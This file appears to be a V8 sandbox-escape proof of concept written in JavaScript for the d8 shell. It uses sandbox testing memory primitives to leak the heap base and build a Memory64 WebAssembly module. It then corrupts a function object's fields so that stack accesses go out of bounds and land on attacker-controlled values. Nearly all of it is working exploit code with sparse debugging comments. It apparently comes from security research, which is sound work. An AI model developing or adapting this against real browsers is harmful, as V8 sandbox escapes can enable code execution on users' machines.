// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t8.js

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }

console.log("[*] Leak sandbox base address");
// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1) - 0x40000n;
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));
// ================================================================

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
// let $Sig_i_iii = builder.addType(kSig_i_iii);

builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
//let kSig_v_i = makeSig([kWasmI32], []);
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kExprI32StoreMem, 0, 0, // i32.store offset = -1
]);
builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
//   kExprI32ConvertI64,
  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
  kExprI64Mul,
]);


let instance = builder.instantiate();

instance.exports.func0(0n);

instance.exports.func1(0n);
instance.exports.func0(0n);

%DebugPrint(instance.exports.func1);

// ===============================
// length has only 2 bytes
// 0xbn
// 174n 
// rsp = rsp + (0xb+1)*8
// v8_write64(0x43001n, 0x0n)
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
console.log((heap_addr + 0x200000n).toString(16));
v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
v8_write64(0x250000n + 0x0EB30n, 0x4141414142424242n);
// v8_write64(0x200095n, 0x4141414142424242n);
v8_write64(0x2000d5n, heap_addr + 0x200000n);



// %SystemBreak();

// trigger out-of-bounds stack
// console.log("[*] After overwriting length");
instance.exports.func1(0x4141n);
